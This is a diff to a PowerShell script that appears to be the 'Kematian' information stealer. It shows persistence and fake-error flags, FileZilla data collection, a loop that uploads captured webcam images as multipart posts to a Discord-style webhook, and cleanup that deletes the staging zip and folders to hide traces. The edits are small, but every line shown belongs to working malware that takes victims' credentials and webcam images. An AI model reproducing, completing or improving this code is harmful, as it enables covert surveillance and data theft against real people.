@@ -7,7 +7,6 @@ $fakeerror = $false
 $persistence = $true
 
 
-
 if ($debug) {
     $ProgressPreference = 'Continue'
 }
@@ -1106,8 +1105,10 @@ FileZilla: $filezilla_info
     $jpegfiles = Get-ChildItem -Path $folder_general -Filter out*.jpg
     foreach ($jpegfile in $jpegfiles) {
         $name = $jpegfile.Name
+        $avatar = "https://i.imgur.com/DOIYOtp.gif"
         $messageContent = @{content = "## :camera: Webcam" ; username = "Kematian" ; avatar_url = $avatar } | ConvertTo-Json; $httpClient = [Net.Http.HttpClient]::new()
-        $multipartContent = [Net.Http.MultipartFormDataContent]::new();$messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent); $messageContentStream = [IO.MemoryStream]::new()
+        $multipartContent = [Net.Http.MultipartFormDataContent]::new()
+        $messageBytes = [Text.Encoding]::UTF8.GetBytes($messageContent); $messageContentStream = [IO.MemoryStream]::new()
         $messageContentStream.Write($messageBytes, 0, $messageBytes.Length); $messageContentStream.Position = 0; $streamContent = [Net.Http.StreamContent]::new($messageContentStream)
         $streamContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/json"); $multipartContent.Add($streamContent, "payload_json")
         $fileStream = [IO.File]::OpenRead("$folder_general\$name"); $fileContent = [Net.Http.StreamContent]::new($fileStream)
@@ -1142,7 +1143,6 @@ FileZilla: $filezilla_info
 
     # cleanup
     Remove-Item "$zipFilePath" -Force
-    Remove-Item "$folder_general" -Force -Recurse
     Remove-Item "$ENV:APPDATA\Kematian" -Force -Recurse
 }
 
